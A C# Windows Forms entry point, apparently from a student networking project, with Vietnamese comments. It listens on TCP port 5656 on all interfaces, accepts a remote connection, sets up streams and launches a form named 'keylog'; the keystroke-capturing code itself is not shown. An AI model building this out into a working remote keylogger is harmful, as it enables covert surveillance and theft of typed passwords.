using System;
using System.Net;
using System.Net.Sockets;
using System.IO;
using System.Windows.Forms;

namespace client
{
    static class Program
    {
        public static TcpClient? client;
        public static NetworkStream? ns;
        public static StreamReader? nr;
        public static StreamWriter? nw;

        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

            try
            {
                // Client đóng vai SERVER → Listen
                TcpListener listener = new TcpListener(IPAddress.Any, 5656);
                listener.Start();

                MessageBox.Show("Client đang chờ Server kết nối...", "Waiting");

                // Accept connection
                client = listener.AcceptTcpClient();
                MessageBox.Show("Server đã kết nối tới Client!", "Connected");

                // Chuẩn hóa 1 bộ Stream duy nhất
                ns = client.GetStream();
                nr = new StreamReader(ns);
                nw = new StreamWriter(ns);
                nw.AutoFlush = true;

                // Chạy form keylog
                Application.Run(new keylog());
            }
            catch (Exception ex)
            {
                MessageBox.Show("Không thể khởi tạo Client: " + ex.Message);
            }
        }
    }
}
